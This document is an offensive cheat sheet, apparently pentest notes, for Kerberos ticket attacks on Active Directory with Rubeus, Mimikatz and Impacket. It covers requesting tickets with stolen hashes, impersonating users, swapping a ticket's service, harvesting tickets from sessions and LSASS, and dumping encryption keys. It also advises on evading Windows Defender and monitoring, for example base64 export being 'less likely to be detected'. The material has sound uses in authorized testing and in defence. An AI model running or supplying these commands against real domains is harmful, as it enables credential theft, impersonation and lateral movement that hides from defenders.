### Ticket Conversion
- converting tickets between impacket and mimikatz/rubeus format
```
kirbi2ccache <KIRBI_FILE> <CCACHE_FILE>
```
```
ccache2kirbi <CCACHE_FILE> <KIRBI_FILE>
```
```
impacket-ticketConverter <CCACHE/KIRBI_FILE> <KIRBI/CCACHE_FILE>
KIRBI -> MIMIKATZ
CCACHE -> IMPACKET
```
### Request New initial TGT
- Requires user's password or hash
- Rubeus
```
rubeus asktgt /domain: /user: /password: /enctype:<RC4|AES128|AES256|3DES>
```
```
#Use aes256 default for enctype
#If you don't have a password but have a hash, replace /password: with /rc4: /aes128: /aes256: or /des:
```
- Mimikatz
```
tgt::ask /domain: /user: /password:
```
- Impacket (remote)
```
impacket-getTGT <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP> -hashes <HASH> export KRB5CCNAME=<TICKET>.ccache
```
### Request Delegated TGT
- Can't change passwords with delegated TGTs but can request TGSes
- domain controllers by default can provide delegated TGTs
- Normal for some processes like explorer but weird for others likenotepad
- for processes where it's weird you don't want to get flagged by windows defender so be sure to use the /host during impacket scripts without knowing the password and convert the ticket to ccache
- Rubeus
```
rubeus tgtdeleg
```
```
/target:<SPN>
```
- Mimikatz
```
#Contacts domain controller by default
tgt::deleg
```
```
#Have another host delegate for you for stealth
/host:<FQDN>
#Find with Get-AdComputer -ldapfilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
```
### Request TGS
- Rubeus
```
rubeus asktgs /service:<SPN>/<FQDN>
```
```
#To impersonate another user (same as request TGT):
/enctype:
/user: <USERNAME>
/password: <PASSWORD>
#If you don't have a password but have a hash replace /password: withg /rc4: /aes128: /aes256: /des:
```
- Mimikatz
```
kerberos::ask /target:<SPN>/<FQDN>
optional /export to export
```
- Impacket (remote)
```
impacket-getST <DOMAIN>/<USER>:<PASSWORD> -spn <SERVICE>/<HOST>
-dc-ip <DC_IP>
-hashes <HASH>
-impersonate <USER>
Note: Automatically modifies impersonate TGS so it can be used with other impacket tools
```
### Modify Existing TGS for Another Service
- Rubeus
```
rubeus asktgs /altservice:<SPN> /ticket:<TICKET>
/ptt will automatically load onto current logon session
```
### Harvesting Tickets
#### Rubeus
- List current session TGT
```
rubeus harvest /interval:30
```
- List current session all tickets with logon id and expiration time
```
rubeus triage
```
- List current session tickets with detailed info
```
rubeus dump
/user:<USER> for a specific user
/service:<SERVICE> for a specific service
/luid:<LOGON_ID> for specific session if we have access to all sesssions (admin)
/nowrap for easier copy and paste
```
#### Mimikatz
- List current session TGT
```
kerberos::tgt
```
- List current session all tickets
```
kerberos::list
```
- List all tickets for all sessions but injects into LSASS memory so don't do it if there's a monitoring service
```
sekurlsa::tickets
```
```
Add /export to any of these to export but first base64 /out:true and base64 /in:true to export base64 encoded (less likely to be detected)
```
### Harvest Keys
#### Mimikatz
```
sekurlsa::ekeys
```
#### Purge Tickets
- Rubeus
```
rubeus purge
```
- Mimikatz
```
kerberos::purge
```
